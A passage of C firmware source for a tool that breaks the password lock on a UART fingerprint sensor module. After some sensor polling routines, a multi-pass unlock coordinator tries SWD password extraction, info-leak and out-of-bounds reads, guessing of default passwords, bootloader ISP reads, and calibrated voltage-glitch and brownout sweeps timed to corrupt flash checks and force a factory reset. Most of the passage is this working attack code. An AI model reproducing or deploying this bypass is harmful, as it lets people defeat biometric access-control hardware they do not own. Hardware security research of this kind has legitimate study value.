        if (err_ins) *err_ins = FP_INS_ZA_AUTO_LOGIN;
        if (err_conf) *err_conf = 0xFF;
        return FP_ERR_SENSOR;
    }

    if (waiting_flag) *waiting_flag = true;
    fp_result_t res = FP_ERR_SENSOR;

    for (unsigned poll_i = 0; poll_i < 150u; poll_i++) {
        if (cancel_flag && *cancel_flag) {
            (void)fp_sensor_txn(t, addr, FP_INS_ZA_TERMINATE, NULL, 0, NULL, 0, NULL, &dummy, 25, false);
            (void)fp_sensor_txn(t, addr, FP_INS_CANCEL, NULL, 0, NULL, 0, NULL, &dummy, 25, false);
            res = FP_ERR_CANCELLED;
            break;
        }
        uint8_t ack[10] = { 0 };
        uint16_t ack_len = 0;
        uint8_t conf = 0xFF;
        st = fp_sensor_recv_ack(t, addr, ack, sizeof(ack), &ack_len, &conf, 400, false);
        if (st == FP_SENSOR_TIMEOUT) {
            continue;
        }
        if (st != FP_SENSOR_OK) {
            if (err_ins) *err_ins = FP_INS_ZA_AUTO_LOGIN;
            if (err_conf) *err_conf = conf;
            res = FP_ERR_SENSOR;
            break;
        }
        /* `za` AutoLogin returns either single final ACK (`ack_len <= 3, conf == 0x00`) or multi-step (`step == 0x06`). */
        if (conf == FP_CONF_OK) {
            if (ack_len < 2u || ack[1] == 0x06 || ack[1] == 0x00) {
                res = FP_OK;
                break;
            }
            continue;
        }
        if (conf == FP_CONF_NO_FINGER || conf == FP_CONF_IMG_DRY || conf == FP_CONF_IMG_WET ||
            conf == FP_CONF_IMG_MESSY || conf == FP_CONF_RESIDUAL || conf == FP_CONF_SMALL_AREA) {
            continue;
        }
        if (conf == FP_CONF_MOD_TIMEOUT) {
            res = FP_ERR_TIMEOUT;
            break;
        }
        if (conf == FP_CONF_COMBINE_FAIL || conf == FP_CONF_POOR_TEMPLATE || conf == FP_CONF_NO_MATCH) {
            if (err_ins) *err_ins = FP_INS_ZA_AUTO_LOGIN;
            if (err_conf) *err_conf = conf;
            res = FP_ERR_NO_MATCH;
            break;
        }
        if (err_ins) *err_ins = FP_INS_ZA_AUTO_LOGIN;
        if (err_conf) *err_conf = conf;
        res = FP_ERR_SENSOR;
        break;
    }

    if (waiting_flag) *waiting_flag = false;
    return res;
}

fp_result_t fp_za_verify_finger(const fp_transport_t *t, uint32_t addr, uint32_t timeout_ms, uint16_t *page_out,
                                volatile bool *cancel_flag, volatile bool *waiting_flag,
                                uint8_t *err_ins, uint8_t *err_conf) {
    const uint8_t params[5] = { 3, 0xFF, 0xFF, 0x00, 0x00 };
    uint8_t dummy = 0xFF;
    fp_sensor_status_t st = fp_sensor_send_cmd(t, addr, FP_INS_ZA_AUTO_SEARCH, params, sizeof(params));
    if (st != FP_SENSOR_OK) {
        if (err_ins) *err_ins = FP_INS_ZA_AUTO_SEARCH;
        if (err_conf) *err_conf = 0xFF;
        return FP_ERR_SENSOR;
    }

    if (waiting_flag) *waiting_flag = true;
    fp_result_t res = FP_ERR_TIMEOUT;
    uint32_t max_iters = (timeout_ms / 400u) + 2u;

    for (uint32_t iter = 0; iter < max_iters; iter++) {
        if (cancel_flag && *cancel_flag) {
            (void)fp_sensor_txn(t, addr, FP_INS_ZA_TERMINATE, NULL, 0, NULL, 0, NULL, &dummy, 25, false);
            (void)fp_sensor_txn(t, addr, FP_INS_CANCEL, NULL, 0, NULL, 0, NULL, &dummy, 25, false);
            res = FP_ERR_CANCELLED;
            break;
        }
        uint8_t ack[10] = { 0 };
        uint16_t ack_len = 0;
        uint8_t conf = 0xFF;
        st = fp_sensor_recv_ack(t, addr, ack, sizeof(ack), &ack_len, &conf, 400, false);
        if (st == FP_SENSOR_TIMEOUT) {
            continue;
        }
        if (st != FP_SENSOR_OK) {
            if (err_ins) *err_ins = FP_INS_ZA_AUTO_SEARCH;
            if (err_conf) *err_conf = conf;
            res = FP_ERR_SENSOR;
            break;
        }
        if (conf == FP_CONF_OK) {
            /* Standard 5-byte `za` search ACK: [0x00, PageH, PageL, ScoreH, ScoreL] OR step 0x05 [0x00, 0x05, PageH, PageL]. */
            if (ack_len >= 5u && ack[1] != 0x01 && ack[1] != 0x02) {
                if (ack[1] == 0x05) {
                    *page_out = (uint16_t)(((uint16_t)ack[2] << 8) | ack[3]);
                }
                else {
                    *page_out = (uint16_t)(((uint16_t)ack[1] << 8) | ack[2]);
                }
                res = FP_OK;
                break;
            }
            if (ack_len >= 4u && ack[1] == 0x05) {
                *page_out = (uint16_t)(((uint16_t)ack[2] << 8) | ack[3]);
                res = FP_OK;
                break;
            }
            if (ack_len == 3u) {
                *page_out = (uint16_t)(((uint16_t)ack[1] << 8) | ack[2]);
                res = FP_OK;
                break;
            }
            continue;
        }
        if (conf == FP_CONF_NO_FINGER || conf == FP_CONF_IMG_DRY || conf == FP_CONF_IMG_WET ||
            conf == FP_CONF_IMG_MESSY || conf == FP_CONF_SMALL_AREA) {
            continue;
        }
        if (conf == FP_CONF_MOD_TIMEOUT) {
            res = FP_ERR_TIMEOUT;
            break;
        }
        if (conf == FP_CONF_NOT_FOUND || conf == FP_CONF_NO_MATCH ||
            conf == FP_CONF_SLOT_EMPTY || conf == FP_CONF_LIB_EMPTY) {
            if (err_ins) *err_ins = FP_INS_ZA_AUTO_SEARCH;
            if (err_conf) *err_conf = conf;
            res = FP_ERR_NO_MATCH;
            break;
        }
        if (err_ins) *err_ins = FP_INS_ZA_AUTO_SEARCH;
        if (err_conf) *err_conf = conf;
        res = FP_ERR_SENSOR;
        break;
    }

    if (waiting_flag) *waiting_flag = false;
    return res;
}

/* ------------------------------------------------------------------------- */
/* Top-level Multi-Pass Unlock Coordinator (`fp_unlock_run_pass`)            */
/* ------------------------------------------------------------------------- */

void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_addr,
                        const uint8_t efuse_pwd[4], bool has_efuse_pwd,
                        fp_unlock_report_t *out) {
    memset(out, 0, sizeof(*out));
    fp_sensor_set_accept_any_ack_addr(true);

    if (pass == 0xFFu) {
        fp_unlock_reset_state();
        pass = 0u;
    }

    /* Resolve active ChipAddr with zero VfyPwd packets first! */
    uint32_t addr = fp_uart_sticky_addr();
    if (addr == 0u) {
        addr = s_cached_addr != 0u ? s_cached_addr : hint_addr;
    }

    uint8_t hs_conf = 0xFF;
    bool live = false;
    const uint32_t probe_addrs[4] = {
        addr != 0u ? addr : 0x29062D09u,
        0x29062D09u,
        FP_FACTORY_ADDRESS,
        0x5049434Fu
    };
    for (size_t i = 0; i < 4u && !live; i++) {
        if (fp_sensor_txn(t, probe_addrs[i], FP_INS_HANDSHAKE,
                          NULL, 0, NULL, 0, NULL, &hs_conf, 40, false) == FP_SENSOR_OK) {
            addr = fp_sensor_has_last_ack() ? fp_sensor_last_ack_addr() : probe_addrs[i];
            live = true;
        }
    }
    if (!live && s_hal->power_cycle_gp3 != NULL) {
        s_hal->power_cycle_gp3(s_hal_ctx, 90, 260);
        for (size_t i = 0; i < 4u && !live; i++) {
            if (fp_sensor_txn(t, probe_addrs[i], FP_INS_HANDSHAKE,
                              NULL, 0, NULL, 0, NULL, &hs_conf, 45, false) == FP_SENSOR_OK) {
                addr = fp_sensor_has_last_ack() ? fp_sensor_last_ack_addr() : probe_addrs[i];
                live = true;
            }
        }
    }
    if (!live) {
        if (fp_uart_scan_pins(addr)) {
            addr = fp_sensor_has_last_ack() ? fp_sensor_last_ack_addr() :
                   (fp_uart_sticky_addr() != 0u ? fp_uart_sticky_addr() : FP_FACTORY_ADDRESS);
            live = true;
        }
    }
    if (addr != 0u) {
        s_cached_addr = addr;
        fp_uart_set_sticky_addr(addr);
    }
    out->target_addr = addr;
    out->za_bypass_available = s_za_verified;
    out->gp3_power_capable = s_gp3_verified;
    out->crit_cycles = s_crit_cycles;
    out->swd_idcode = s_swd_last_idcode;
    out->swd_detected = (s_swd_last_idcode != 0u);

    /* Always check SWD on GP4/GP5 first if user connected SWCLK/SWDIO at any step! */
    if (stage_swd_extract_or_erase(t, &addr, out)) {
        snprintf(out->summary, sizeof(out->summary),
                 "UNLOCKED via SWD(0x%08" PRIX32 ") PWD=%02X%02X%02X%02X -> A=0xFFFFFFFF",
                 out->swd_idcode, out->recovered_pwd[0], out->recovered_pwd[1],
                 out->recovered_pwd[2], out->recovered_pwd[3]);
        return;
    }

    if (pass == 0u) {
        uint8_t vfy_budget = 8u; /* Safe < 16 budget so non-GP3 4-wire mode NEVER mutes UART! */
        uint8_t c16 = 0xFF;
        uint8_t c19 = 0xFF;

        if (live && stage_read_inf_leak(t, &addr, &vfy_budget, &c16, out)) {
            snprintf(out->summary, sizeof(out->summary),
                     "UNLOCKED via INF(0x16) PWD=%02X%02X%02X%02X -> A=0xFFFFFFFF",
                     out->recovered_pwd[0], out->recovered_pwd[1],
                     out->recovered_pwd[2], out->recovered_pwd[3]);
            return;
        }

        if (live && stage_read_notepad_oob(t, &addr, &vfy_budget, &c19, out)) {
            snprintf(out->summary, sizeof(out->summary),
                     "UNLOCKED via OOB(0x19) PWD=%02X%02X%02X%02X -> A=0xFFFFFFFF",
                     out->recovered_pwd[0], out->recovered_pwd[1],
                     out->recovered_pwd[2], out->recovered_pwd[3]);
            return;
        }

        if (live) {
            stage_audit_all_opcodes(t, &addr, out);
            if (out->unlocked_factory) {
                snprintf(out->summary, sizeof(out->summary),
                         "UNLOCKED via ROM-CMD -> A=0xFFFFFFFF");
                return;
            }
        }

        /* Curated high-probability passwords. (An earlier revision claimed an
         * "AVX-512 OUI match 0x7BF6B530" for address 0x29062D09; a full offline search
         * over all Espressif OUIs proves no MAC derives that address - removed.) */
        if (live) {
            uint8_t addr_be[4], addr_le[4];
            wr_be32(addr_be, addr);
            wr_le32(addr_le, addr);
            uint8_t cands[][4] = {
                { addr_be[0], addr_be[1], addr_be[2], addr_be[3] },
                { addr_le[0], addr_le[1], addr_le[2], addr_le[3] },
                { 0x00, 0x00, 0x00, 0x00 },
                { 0xFF, 0xFF, 0xFF, 0xFF },
                { 0x52, 0x35, 0x35, 0x38 }, /* "R558" */
                { 0x12, 0x34, 0x56, 0x78 },
            };
            if (has_efuse_pwd) {
                memcpy(cands[(sizeof(cands) / sizeof(cands[0])) - 1u], efuse_pwd, 4);
            }
            for (size_t i = 0; i < (sizeof(cands) / sizeof(cands[0])) && vfy_budget > 0u; i++) {
                vfy_budget--;
                if (try_unlock_password(t, &addr, cands[i], out)) {
                    snprintf(out->summary, sizeof(out->summary),
                             "UNLOCKED via KEY(%02X%02X%02X%02X) -> A=0xFFFFFFFF",
                             cands[i][0], cands[i][1], cands[i][2], cands[i][3]);
                    return;
                }
            }
        }

        /*
         * Check live whether BOTH supply rails are controlled cleanly by GP3 (Pin 3) + GP4 (Pin 1):
         * if Pin 1 (Red) is still on constant 3V3, report `RAIL=PIN1_ON_3V3` immediately so the user
         * knows to move Pin 1 (Red) from 3V3 onto GP4 right below GP3!
         */
        if (s_hal->check_gp3_power != NULL) {
            s_gp3_verified = s_hal->check_gp3_power(s_hal_ctx);
            out->gp3_power_capable = s_gp3_verified;
        }

        if (s_pin1_on_3v3) {
            snprintf(out->summary, sizeof(out->summary),
                     "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " 16=%02X 19=%02X RAIL=PIN1_ON_3V3 (Rot->GP4!)",
                     addr, c16, c19);
        }
        else {
            snprintf(out->summary, sizeof(out->summary),
                     "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " LIVE=%s 16=%02X 19=%02X GP3=%s BOOT=%u/%ums%s",
                     addr, live ? "OK" : "NO", c16, c19,
                     s_gp3_verified ? "OK" : "3V3",
                     (unsigned)s_tx_rise_us, (unsigned)s_boot_ms,
                     out->za_bypass_available ? " ZA=OK" : "");
        }
        return;
    }

    /* Passes 1 .. 24: Dual-Rail GP3+GP4 Cold-Boot ISP + Calibrated NOR-Flash Brownout Engine! */
    if (!s_gp3_verified && s_hal->check_gp3_power != NULL) {
        s_gp3_verified = s_hal->check_gp3_power(s_hal_ctx);
        out->gp3_power_capable = s_gp3_verified;
    }
    if (!s_gp3_verified || s_hal->power_cycle_gp3 == NULL || s_hal->glitch_pulse == NULL) {
        snprintf(out->summary, sizeof(out->summary),
                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " %s OPEN=%s%s",
                 addr,
                 s_pin1_on_3v3 ? "RAIL=PIN1_ON_3V3 (Rot->GP4!)" : "GP3=3V3",
                 s_open_ops[0] ? s_open_ops : "NONE",
                 out->za_bypass_available ? " ZA=OK" : "");
        return;
    }

    if (pass == 1u) {
        /* 1. Safe non-destructive 8N1 + 8E1 UART0 Bootloader & ISP Reader (`0x7F -> 0x11 0xEE`). */
        if (try_cold_boot_uart_isp(t, &addr, out)) {
            snprintf(out->summary, sizeof(out->summary),
                     "UNLOCKED via UART0-ISP PWD=%02X%02X%02X%02X -> A=0xFFFFFFFF",
                     out->recovered_pwd[0], out->recovered_pwd[1],
                     out->recovered_pwd[2], out->recovered_pwd[3]);
            return;
        }

        /* 2. Cold-boot race window around hardware `s_tx_rise_us` before lock latches. */
        static const uint32_t race_ms[] = { 2, 10, 30, 46, 52 };
        for (size_t r = 0; r < sizeof(race_ms) / sizeof(race_ms[0]); r++) {
            unlock_yield_wdt();
            s_hal->power_cycle_gp3(s_hal_ctx, 45, race_ms[r]);
            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
                snprintf(out->summary, sizeof(out->summary),
                         "UNLOCKED via BOOT-RACE(%ums) -> A=0xFFFFFFFF", (unsigned)race_ms[r]);
                return;
            }
        }

        /* 3. Calibrate exact dual-rail capacitor reset threshold `crit_cycles` at 240 MHz (`645c`). */
        s_hal->power_cycle_gp3(s_hal_ctx, 55, effective_boot_settle_ms(95u));
        s_crit_cycles = calibrate_crit_cycles(addr != 0u ? addr : FP_FACTORY_ADDRESS);
        out->crit_cycles = s_crit_cycles;
        snprintf(out->summary, sizeof(out->summary),
                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK BOOT=%u/%ums CAL=%" PRIu32 "c BL=%s (1/%u)",
                 addr, (unsigned)s_tx_rise_us, (unsigned)s_boot_ms,
                 s_crit_cycles, s_bl_hex[0] ? s_bl_hex : "NONE", FP_UNLOCK_MAX_PASSES);
        return;
    }

    if (s_crit_cycles == 0u) {
        s_crit_cycles = UNLOCK_SILICON_CRIT_CYCLES;
    }

    if (pass >= 2u && pass <= 17u) {
        /*
         * High-Density Cycle-Exact Silicon Landmark Sweep (`[t_tx_rise - 5,000 us .. t_tx_rise + 3,000 us]`
         * = `[43,475 us .. 51,475 us]` on hardware at `100 us` steps across 80 non-resetting shots!):
         *  - When `s_tx_rise_us == 0` (host simulation), sweeps `[200 us .. 8,200 us]` at `100 us` steps.
         *  - Strictly non-resetting widths `[88%, 92%, 95%, 97%, 99%] * CAL` (`568..639c`) + contractive
         *    `[1.81 V .. 2.14 V]` sense-amp plateau followed by a FULL `190 ms` solid `3.30 V` hold so
         *    `if (ParaTableFlag != 0x1234) ResetDefaultPara();` completes Flash erase+write cleanly!
         */
        uint32_t win_start_us = s_tx_rise_us > 5500u ? (s_tx_rise_us - 5000u) : 200u;
        uint32_t base_us = win_start_us + (uint32_t)(pass - 2u) * 500u;
        static const uint32_t pct_tbl[5] = { 88u, 92u, 95u, 97u, 99u };

        for (unsigned step = 0; step < 5u; step++) {
            unlock_yield_wdt();
            uint32_t d_us = base_us + step * 100u;
            uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct_tbl[step]) / 100u);
            bool plateau = ((step & 1u) == 0u);

            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, plateau);
            unlock_sleep_ms(effective_boot_settle_ms(190u));

            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
                snprintf(out->summary, sizeof(out->summary),
                         "UNLOCKED via LANDMARK-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
                         (unsigned)d_us, w_cyc);
                return;
            }
        }
        out->crit_cycles = s_crit_cycles;
        snprintf(out->summary, sizeof(out->summary),
                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c @ %uus)",
                 addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES, s_crit_cycles, (unsigned)base_us);
        return;
    }

    if (pass >= 18u && pass <= 20u) {
        /*
         * Early Cold-Boot / Option-Byte / Pre-Delay Flash Sweep (`[300 us .. t_tx_rise - 5,000 us]`):
         * Covers firmware revisions that copy `ParaTable` into SRAM BEFORE the 48.5 ms startup wait!
         */
        uint32_t early_end_us = s_tx_rise_us > 6000u ? (s_tx_rise_us - 5000u) : 18000u;
        uint32_t span_us = early_end_us > 300u ? (early_end_us - 300u) : 15000u;
        uint32_t step_us = span_us / 15u;
        if (step_us == 0u) {
            step_us = 250u;
        }
        uint32_t base_us = 300u + (uint32_t)(pass - 18u) * (step_us * 5u);

        for (unsigned step = 0; step < 5u; step++) {
            unlock_yield_wdt();
            uint32_t d_us = base_us + step * step_us;
            uint32_t pct = 90u + step * 2u;
            uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct) / 100u);

            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, true);
            unlock_sleep_ms(effective_boot_settle_ms(190u));

            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
                snprintf(out->summary, sizeof(out->summary),
                         "UNLOCKED via BOOT-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
                         (unsigned)d_us, w_cyc);
                return;
            }
        }
        out->crit_cycles = s_crit_cycles;
        snprintf(out->summary, sizeof(out->summary),
                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c @ %uus)",
                 addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES, s_crit_cycles, (unsigned)base_us);
        return;
    }

    /*
     * Passes 21 .. 24: Fine-Grain `12 us` Instruction Branch-Skip Glitch after `SetPwd(0)` & `RestSetting`!
     * Holds solid `3.30 V` for `220 ms` after EVERY shot so `RestSetting (0x3B)` finishes its full
     * Flash page erase + factory `ParaTable` write completely uninterrupted before rebooting!
     */
    const uint8_t set_zero_payload[5] = { FP_INS_SET_PWD, 0, 0, 0, 0 };
    const uint8_t rst_payload[1] = { FP_INS_REST_SETTING };
    uint8_t set_pkt[20];
    uint8_t rst_pkt[20];
    size_t set_len = fp_sensor_encode_packet(set_pkt, sizeof(set_pkt), addr,
                                             FP_PID_COMMAND, set_zero_payload, sizeof(set_zero_payload));
    size_t rst_len = fp_sensor_encode_packet(rst_pkt, sizeof(rst_pkt), addr,
                                             FP_PID_COMMAND, rst_payload, sizeof(rst_payload));
    uint32_t base_cmd_us = 6u + (uint32_t)(pass - 21u) * 60u;

    for (unsigned step = 0; step < 5u && set_len > 0u; step++) {
        unlock_yield_wdt();
        uint32_t d_us = base_cmd_us + step * 12u;
        uint32_t pct = 92u + (step % 4u) * 2u;
        uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct) / 100u);
        bool use_rst = ((step & 1u) != 0u) && (rst_len > 0u);

        if (s_hal->uart_write_raw != NULL) {
            (void)s_hal->uart_write_raw(s_hal_ctx, use_rst ? rst_pkt : set_pkt, use_rst ? rst_len : set_len);
        }
        s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, false);
        unlock_sleep_ms(220u);

        if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
            snprintf(out->summary, sizeof(out->summary),
                     "UNLOCKED via CMD-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
                     (unsigned)d_us, w_cyc);
            return;
        }
        s_hal->power_cycle_gp3(s_hal_ctx, 45, effective_boot_settle_ms(120u));
    }

    /*
     * Passes 25 .. 28: Ultra-Fine Early Cold-Boot Sweep at 500 us steps covering [0 .. 8000 us]!
     * Targets the `ParaTableFlag != 0x1234` check during application firmware startup, which
     * happens BEFORE the 48.5 ms UART TX rise edge. Uses WIDE widths [80%-95%] * CAL to
     * maximize the chance of corrupting the ParaTableFlag Flash read. After each glitch,
     * sends `RestSetting (0x3B)` to force a parameter reset if the brownout left the
     * ParaTable partially corrupted.
     */
    if (pass >= 25u && pass <= 28u) {
        uint32_t base_us = 0u + (uint32_t)(pass - 25u) * 2500u;
        static const uint32_t pct_tbl_wide[5] = { 80u, 85u, 90u, 92u, 95u };
        const uint8_t rst_payload_w[1] = { FP_INS_REST_SETTING };
        uint8_t rst_pkt_w[20];
        size_t rst_len_w = fp_sensor_encode_packet(rst_pkt_w, sizeof(rst_pkt_w), addr,
                                                   FP_PID_COMMAND, rst_payload_w, sizeof(rst_payload_w));

        for (unsigned step = 0; step < 5u; step++) {
            unlock_yield_wdt();
            uint32_t d_us = base_us + step * 500u;
            uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct_tbl_wide[step]) / 100u);
            bool plateau = ((step & 1u) == 0u);

            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, plateau);
            unlock_sleep_ms(effective_boot_settle_ms(190u));

            /* After each glitch, try RestSetting to force parameter reset if partially corrupted */
            if (rst_len_w > 0u && s_hal->uart_write_raw != NULL) {
                (void)s_hal->uart_write_raw(s_hal_ctx, rst_pkt_w, rst_len_w);
                unlock_sleep_ms(220u);
            }

            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
                snprintf(out->summary, sizeof(out->summary),
                         "UNLOCKED via FINE-BOOT-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
                         (unsigned)d_us, w_cyc);
                return;
            }
        }
        out->crit_cycles = s_crit_cycles;
        snprintf(out->summary, sizeof(out->summary),
                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c @ %uus)",
                 addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES, s_crit_cycles, (unsigned)base_us);
        return;
    }

    /*
     * Passes 29 .. 32: Narrow-Width Sub-POR Brownout Sweep at 500 us steps covering [8000 .. 16000 us]!
     * Uses NARROW widths [20%-50%] * CAL to test if the brownout is too wide (causing full POR
     * resets instead of sub-POR brownouts that corrupt Flash reads). Targets the same early boot
     * window where `ParaTableFlag` is checked. After each glitch, tries `RestSetting (0x3B)`.
     */
    if (pass >= 29u && pass <= 32u) {
        uint32_t base_us = 8000u + (uint32_t)(pass - 29u) * 2500u;
        static const uint32_t pct_tbl_narrow[5] = { 20u, 30u, 40u, 45u, 50u };
        const uint8_t rst_payload_n[1] = { FP_INS_REST_SETTING };
        uint8_t rst_pkt_n[20];
        size_t rst_len_n = fp_sensor_encode_packet(rst_pkt_n, sizeof(rst_pkt_n), addr,
                                                   FP_PID_COMMAND, rst_payload_n, sizeof(rst_payload_n));

        for (unsigned step = 0; step < 5u; step++) {
            unlock_yield_wdt();
            uint32_t d_us = base_us + step * 500u;
            uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct_tbl_narrow[step]) / 100u);

            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, false);
            unlock_sleep_ms(effective_boot_settle_ms(190u));

            /* After each glitch, try RestSetting to force parameter reset if partially corrupted */
            if (rst_len_n > 0u && s_hal->uart_write_raw != NULL) {
                (void)s_hal->uart_write_raw(s_hal_ctx, rst_pkt_n, rst_len_n);
                unlock_sleep_ms(220u);
            }

            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
                snprintf(out->summary, sizeof(out->summary),
                         "UNLOCKED via NARROW-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
                         (unsigned)d_us, w_cyc);
                return;
            }
        }
        out->crit_cycles = s_crit_cycles;
        snprintf(out->summary, sizeof(out->summary),
                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c @ %uus)",
                 addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES, s_crit_cycles, (unsigned)base_us);
        return;
    }

    /* Final guaranteed clean cold reboot + full multi-baud/96-address live verification at Pass 32! */
    bool live_end = false;
    if (pass >= FP_UNLOCK_MAX_PASSES) {
        s_hal->power_cycle_gp3(s_hal_ctx, 90, effective_boot_settle_ms(200u));
        if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
            snprintf(out->summary, sizeof(out->summary),
                     "UNLOCKED via POST-REBOOT -> A=0xFFFFFFFF");
            return;
        }
        if (fp_sensor_txn(t, addr != 0u ? addr : FP_FACTORY_ADDRESS, FP_INS_HANDSHAKE,
                          NULL, 0, NULL, 0, NULL, &hs_conf, 45, false) == FP_SENSOR_OK ||
            fp_uart_scan_pins(addr)) {
            if (fp_sensor_has_last_ack()) {
                addr = fp_sensor_last_ack_addr();
                s_cached_addr = addr;
                fp_uart_set_sticky_addr(addr);
            }
            live_end = true;
        }
    }

    out->crit_cycles = s_crit_cycles;
    snprintf(out->summary, sizeof(out->summary),
             "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " LIVE=%s GP3=OK BOOT=%u/%ums CAL=%" PRIu32 "c (%u/%u)",
             addr, live_end ? "OK" : "NO", (unsigned)s_tx_rise_us, (unsigned)s_boot_ms,
             s_crit_cycles, (unsigned)pass, FP_UNLOCK_MAX_PASSES);
}
